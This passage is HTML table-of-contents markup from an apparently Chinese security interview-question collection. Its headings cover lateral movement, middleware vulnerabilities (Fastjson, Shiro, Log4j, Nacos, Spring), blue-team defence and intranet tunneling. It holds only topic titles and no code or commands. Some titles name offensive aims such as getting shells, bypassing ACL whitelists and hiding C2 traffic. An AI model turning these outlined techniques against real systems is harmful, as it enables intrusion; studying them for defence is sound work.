href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%89%8B%E6%AE%B5"><span class="toc-number">6.0.12.</span> <span class="toc-text">横向渗透命令执行手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH%E3%80%81PTT%E3%80%81PTK-%E4%B8%89%E8%80%85%E5%8C%BA%E5%88%AB"><span class="toc-number">6.0.13.</span> <span class="toc-text">PTH、PTT、PTK 三者区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%B0%E6%9C%BA%E5%99%A8%E4%B8%8D%E8%83%BD%E5%87%BA%E7%BD%91%EF%BC%8C%E5%A6%82%E4%BD%95%E6%8A%8A%E4%B8%80%E4%B8%AA-exe-%E6%96%87%E4%BB%B6%E6%94%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8A%E5%8E%BB"><span class="toc-number">6.0.14.</span> <span class="toc-text">一台机器不能出网，如何把一个 exe 文件放到对应的目标机器上去</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4%E5%9F%9F%E5%86%85%E5%A7%94%E6%B4%BE"><span class="toc-number">6.0.15.</span> <span class="toc-text">说说域内委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E6%9B%BE%E7%BB%8F%E7%99%BB%E5%BD%95%E5%93%AA%E4%BA%9B%E6%9C%BA%E5%99%A8"><span class="toc-number">6.0.16.</span> <span class="toc-text">怎么定位域管曾经登录哪些机器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">7.</span> <span class="toc-text">7- 中间件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.1.</span> <span class="toc-text">Fastjson 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E9%9D%B6%E6%A0%87%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8-Shiro"><span class="toc-number">7.0.2.</span> <span class="toc-text">如何判断靶标是否使用 Shiro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nacos-%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%8B%BF-Shell"><span class="toc-number">7.0.3.</span> <span class="toc-text">Nacos 如何通过配置文件拿 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nacos-%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">7.0.4.</span> <span class="toc-text">Nacos 不出网利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#do-%E6%96%87%E4%BB%B6%E6%98%AF%E5%93%AA%E7%A7%8D%E6%A1%86%E6%9E%B6"><span class="toc-number">7.0.5.</span> <span class="toc-text">.do 文件是哪种框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-%E6%9C%89-Key-%E6%97%A0%E9%93%BE%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8"><span class="toc-number">7.0.6.</span> <span class="toc-text">Shiro 有 Key 无链怎么利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.7.</span> <span class="toc-text">Redis 主从复制原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin-%E5%86%99-Shell-%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">7.0.8.</span> <span class="toc-text">phpMyAdmin 写 Shell 的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E8%BF%87%E5%93%AA%E4%BA%9B%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.0.9.</span> <span class="toc-text">了解过哪些中间件解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-%E4%B8%8D%E5%87%BA%E7%BD%91%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8"><span class="toc-number">7.0.10.</span> <span class="toc-text">Shiro 不出网怎么利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-%E7%9A%84%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.11.</span> <span class="toc-text">JNDI 的解析流程和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.12.</span> <span class="toc-text">Log4j 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runc-%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.13.</span> <span class="toc-text">runc 容器逃逸原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JBoss-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.14.</span> <span class="toc-text">JBoss 反序列化漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XStreadm-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.15.</span> <span class="toc-text">XStreadm 反序列化漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-Confluence-RCE"><span class="toc-number">7.0.16.</span> <span class="toc-text">讲讲 Confluence RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E4%B8%8B-Spring-%E7%9B%B8%E5%85%B3%E7%9A%84-RCE-%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.17.</span> <span class="toc-text">讲下 Spring 相关的 RCE 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j-%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-trustURLCodebase"><span class="toc-number">7.0.18.</span> <span class="toc-text">Log4j 如何绕过 trustURLCodebase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99-gadget-%E6%98%AF%E5%93%AA%E6%9D%A1%EF%BC%8C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">7.0.19.</span> <span class="toc-text">Fastjson 文件读写 gadget 是哪条，原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring4shell-%E5%8E%9F%E7%90%86-%E6%A3%80%E6%B5%8B-%E5%88%A9%E7%94%A8"><span class="toc-number">7.0.20.</span> <span class="toc-text">Spring4shell 原理&amp;检测&amp;利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kubernetes-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">7.0.21.</span> <span class="toc-text">Kubernetes 攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro-550-721-%E5%8C%BA%E5%88%AB"><span class="toc-number">7.0.22.</span> <span class="toc-text">Shiro 550 721 区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJSON-%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">7.0.23.</span> <span class="toc-text">FastJSON 不出网利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E5%92%8C-Linux-%E5%88%A9%E7%94%A8-REDIS-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">7.0.24.</span> <span class="toc-text">Windows 和 Linux 利用 REDIS 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-CRLF-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">7.0.25.</span> <span class="toc-text">Nginx CRLF 注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E9%9D%B6%E6%A0%87%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8-FastJSON"><span class="toc-number">7.0.26.</span> <span class="toc-text">如何判断靶标是否使用 FastJSON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E9%9D%B6%E6%A0%87%E6%98%AF%E5%90%A6%E4%BD%BF%E7%94%A8-Log4j"><span class="toc-number">7.0.27.</span> <span class="toc-text">如何判断靶标是否使用 Log4j</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-%E8%93%9D%E9%98%9F%E9%98%B2%E5%AE%88%E7%B3%BB%E5%88%97"><span class="toc-number">8.</span> <span class="toc-text">8- 蓝队防守系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80%E6%80%9D%E8%B7%AF"><span class="toc-number">8.0.1.</span> <span class="toc-text">内存马查杀思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E6%94%BB%E5%87%BB%E8%80%85-IP-%E6%80%8E%E4%B9%88%E6%BA%AF%E6%BA%90"><span class="toc-number">8.0.2.</span> <span class="toc-text">拿到攻击者 IP 怎么溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E6%94%BB%E5%87%BB%E8%80%85-IP-%E6%80%8E%E4%B9%88%E6%BA%AF%E6%BA%90-1"><span class="toc-number">8.0.3.</span> <span class="toc-text">拿到攻击者 IP 怎么溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E6%A0%B7%E4%BB%8E%E6%97%A5%E5%BF%97%E6%89%BE-WebShell-%E4%BD%8D%E7%BD%AE"><span class="toc-number">8.0.4.</span> <span class="toc-text">怎样从日志找 WebShell 位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E6%A0%B7%E4%BB%8E%E6%97%A5%E5%BF%97%E6%89%BE-WebShell-%E4%BD%8D%E7%BD%AE-1"><span class="toc-number">8.0.5.</span> <span class="toc-text">怎样从日志找 WebShell 位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E6%8C%82%E9%A9%AC%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">8.0.6.</span> <span class="toc-text">网页挂马排查思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">8.0.7.</span> <span class="toc-text">XSS 防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">8.0.8.</span> <span class="toc-text">CSRF 防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-1"><span class="toc-number">8.0.9.</span> <span class="toc-text">CSRF 防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">8.0.10.</span> <span class="toc-text">XXE 防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">8.0.11.</span> <span class="toc-text">文件上传防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-1"><span class="toc-number">8.0.12.</span> <span class="toc-text">文件上传防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">8.0.13.</span> <span class="toc-text">CS 流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81-1"><span class="toc-number">8.0.14.</span> <span class="toc-text">CS 流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E8%A2%AB%E5%88%A0%E9%99%A4%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5"><span class="toc-number">8.0.15.</span> <span class="toc-text">日志被删除如何排查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%9B%BA%E6%89%8B%E6%AE%B5"><span class="toc-number">8.0.16.</span> <span class="toc-text">常见加固手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81"><span class="toc-number">8.0.17.</span> <span class="toc-text">挖矿病毒特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%BA%94%E6%80%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">8.0.18.</span> <span class="toc-text">挖矿病毒应急思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6"><span class="toc-number">8.0.19.</span> <span class="toc-text">如何判断钓鱼邮件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E9%9C%B2%E9%9D%A2%E6%A2%B3%E7%90%86%E6%80%8E%E4%B9%88%E5%81%9A"><span class="toc-number">8.0.20.</span> <span class="toc-text">暴露面梳理怎么做</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netstat-%E5%92%8C-ss-%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">8.0.21.</span> <span class="toc-text">netstat 和 ss 命令的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%97%A5%E5%BF%97%E5%AD%98%E5%82%A8%E4%BD%8D%E7%BD%AE"><span class="toc-number">8.0.22.</span> <span class="toc-text">Windows 日志存储位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81-Windows-%E4%BA%8B%E4%BB%B6-ID"><span class="toc-number">8.0.23.</span> <span class="toc-text">常见 Windows 事件 ID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E4%BA%A7%E5%93%81%E7%9A%84%E5%BA%94%E6%80%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">8.0.24.</span> <span class="toc-text">云产品的应急思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-%E9%87%8D%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">8.0.25.</span> <span class="toc-text">DNS 重绑定漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token-%E5%92%8C-Referer-%E7%9A%84%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E8%B0%81%E9%AB%98"><span class="toc-number">8.0.26.</span> <span class="toc-text">Token 和 Referer 的安全等级谁高</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">8.0.27.</span> <span class="toc-text">任意文件下载漏洞防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9-TTL-%E5%80%BC"><span class="toc-number">8.0.28.</span> <span class="toc-text">怎么修改 TTL 值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E4%BA%86%E5%93%AA%E4%BA%9B%E6%96%87%E4%BB%B6"><span class="toc-number">8.0.29.</span> <span class="toc-text">Linux 怎么查看程序调用了哪些文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A6%82%E4%BD%95%E6%9F%A5%E8%AF%A2%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-number">8.0.30.</span> <span class="toc-text">CMD 命令行如何查询远程终端开放端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMD-%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%A6%82%E4%BD%95%E6%9F%A5%E8%AF%A2%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3-1"><span class="toc-number">8.0.31.</span> <span class="toc-text">CMD 命令行如何查询远程终端开放端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%8F%AF%E7%96%91%E8%B4%A6%E5%8F%B7%E3%80%81%E6%96%B0%E5%A2%9E%E8%B4%A6%E5%8F%B7"><span class="toc-number">8.0.32.</span> <span class="toc-text">查看服务器是否存在可疑账号、新增账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E9%9A%90%E8%97%8F%E8%B4%A6%E5%8F%B7%E3%80%81%E5%85%8B%E9%9A%86%E8%B4%A6%E5%8F%B7"><span class="toc-number">8.0.33.</span> <span class="toc-text">查看服务器是否存在隐藏账号、克隆账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%94%A8%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E9%98%B2%E5%BE%A1%E6%97%B6%EF%BC%8C%E5%A6%82%E6%9E%9C%E9%81%87%E5%88%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%88%97%E5%90%8D%E6%88%96%E6%98%AF%E8%A1%A8%E5%90%8D%E6%9C%AC%E8%BA%AB%E5%B0%B1%E5%B8%A6%E7%9D%80%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">8.0.34.</span> <span class="toc-text">SQL 注入用转义字符防御时，如果遇到数据库的列名或是表名本身就带着特殊字符怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-aspx-%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%9D%83%E9%99%90%E4%BC%9A%E6%AF%94-asp-%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%9D%83%E9%99%90%E6%9B%B4%E9%AB%98"><span class="toc-number">8.0.35.</span> <span class="toc-text">为什么 aspx 木马的权限会比 asp 木马的权限更高</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%93%AA%E4%BA%9B-SQL-%E8%AF%AD%E5%8F%A5%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">8.0.36.</span> <span class="toc-text">有哪些 SQL 语句无法使用预编译的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYN-%E5%BC%80%E6%94%BE%E9%93%BE%E6%8E%A5%E5%8E%9F%E7%90%86"><span class="toc-number">8.0.37.</span> <span class="toc-text">SYN 开放链接原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3-Linux-proc-%E7%9B%AE%E5%BD%95%E5%90%97"><span class="toc-number">8.0.38.</span> <span class="toc-text">了解 Linux &#x2F;proc 目录吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%9B%91%E6%8E%A7-Linux-%E6%96%87%E4%BB%B6%E6%93%8D"><span class="toc-number">8.0.39.</span> <span class="toc-text">如何监控 Linux 文件操</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Defender-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-number">8.0.40.</span> <span class="toc-text">Windows Defender 安全机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-TCP-%E7%B2%98%E5%8C%85-%E6%8B%86%E5%8C%85"><span class="toc-number">8.0.41.</span> <span class="toc-text">什么是 TCP 粘包&#x2F;拆包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-TCP-%E7%B2%98%E5%8C%85-%E6%8B%86%E5%8C%85-1"><span class="toc-number">8.0.42.</span> <span class="toc-text">什么是 TCP 粘包&#x2F;拆包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E9%95%BF%E8%BF%9E%E6%8E%A5%E5%92%8C%E7%9F%AD%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">8.0.43.</span> <span class="toc-text">HTTP 长连接和短连接的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xrange-%E5%92%8C-range-%E8%BF%94%E5%9B%9E%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">8.0.44.</span> <span class="toc-text">Xrange() 和 range() 返回的是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E9%98%B2%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="toc-number">8.0.45.</span> <span class="toc-text">怎么防重放攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD-Log4j-%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F"><span class="toc-number">8.0.46.</span> <span class="toc-text">如何判断 Log4j 攻击成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-SYN-FLOOD-%E5%8E%9F%E7%90%86%EF%BC%8C%E9%98%B2%E5%BE%A1%EF%BC%8C%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5"><span class="toc-number">8.0.47.</span> <span class="toc-text">讲讲 SYN FLOOD 原理，防御，检测手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-UDP-%E5%8F%8D%E5%B0%84%E6%94%BE%E5%A4%A7%E7%9A%84%E5%8E%9F%E7%90%86%EF%BC%8C%E9%98%B2%E5%BE%A1%EF%BC%8C%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5"><span class="toc-number">8.0.48.</span> <span class="toc-text">讲讲 UDP 反射放大的原理，防御，检测手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E4%BD%A0%E4%B8%80%E4%B8%AA%E5%91%8A%E8%AD%A6%E7%9A%84%E5%86%85%E7%BD%91-IP%EF%BC%8C%E6%80%8E%E4%B9%88%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E5%88%B0%E4%BB%96%E5%9C%A8%E5%93%AA%E6%A0%8B%E6%A5%BC%E5%93%AA%E5%B1%82"><span class="toc-number">8.0.49.</span> <span class="toc-text">给你一个告警的内网 IP，怎么快速定位到他在哪栋楼哪层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">8.0.50.</span> <span class="toc-text">SQL 注入防御方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E4%B8%87%E6%9D%A1%E5%91%8A%E8%AD%A6%E6%80%8E%E4%B9%88%E5%BF%AB%E9%80%9F%E6%89%BE%E5%88%B0%E6%94%BB%E5%87%BB%E6%88%90%E5%8A%9F%E7%9A%84%E5%91%8A%E8%AD%A6"><span class="toc-number">8.0.51.</span> <span class="toc-text">数万条告警怎么快速找到攻击成功的告警</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell-%E6%9F%A5%E6%9D%80%E5%90%8E%E4%BB%8D%E6%9C%89%E6%B5%81%E9%87%8F%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">8.0.52.</span> <span class="toc-text">WebShell 查杀后仍有流量怎么办</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%B3%BB%E5%88%97"><span class="toc-number">9.</span> <span class="toc-text">9- 内网穿透系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell-%E6%9F%A5%E6%9D%80%E5%90%8E%E4%BB%8D%E6%9C%89%E6%B5%81%E9%87%8F%E6%80%8E%E4%B9%88%E5%8A%9E-1"><span class="toc-number">9.0.1.</span> <span class="toc-text">WebShell 查杀后仍有流量怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%9C%89-ACL-%E7%AD%96%E7%95%A5%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AF%E7%99%BD%E5%90%8D%E5%8D%95%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">9.0.2.</span> <span class="toc-text">内网有 ACL 策略，如果是白名单如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">9.0.3.</span> <span class="toc-text">如何进行内网穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8F-CS-%E6%B5%81%E9%87%8F"><span class="toc-number">9.0.4.</span> <span class="toc-text">如何隐藏 CS 流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8F-CS-%E6%B5%81%E9%87%8F-1"><span class="toc-number">9.0.5.</span> <span class="toc-text">如何隐藏 CS 流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">9.0.6.</span> <span class="toc-text">代理转发常用的工具有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%9C%89%E5%93%AA%E4%BA%9B-1"><span class="toc-number">9.0.7.</span> <span class="toc-text">代理转发常用的工具有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%9A%84%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86%E7%94%A8%E4%BB%80%E4%B9%88%E4%B8%9C%E8%A5%BF%E4%BB%A3%E7%90%86"><span class="toc-number">9.0.8.</span> <span class="toc-text">内网的多级代理用什么东西代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C-TCP-%E5%92%8C-UDP-%E4%B8%8D%E5%87%BA%E7%BD%91%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">9.0.9.</span> <span class="toc-text">如果 TCP 和 UDP 不出网怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86%E5%A6%82%E4%BD%95%E5%81%9A%E4%B8%80%E4%B8%AA-CDN-%E8%BF%9B%E8%A1%8C%E4%B8%AD%E8%BD%AC"><span class="toc-number">9.0.10.</span> <span class="toc-text">多级代理如何做一个 CDN 进行中转</span></a></li></ol></li></ol></li><li class="toc-item 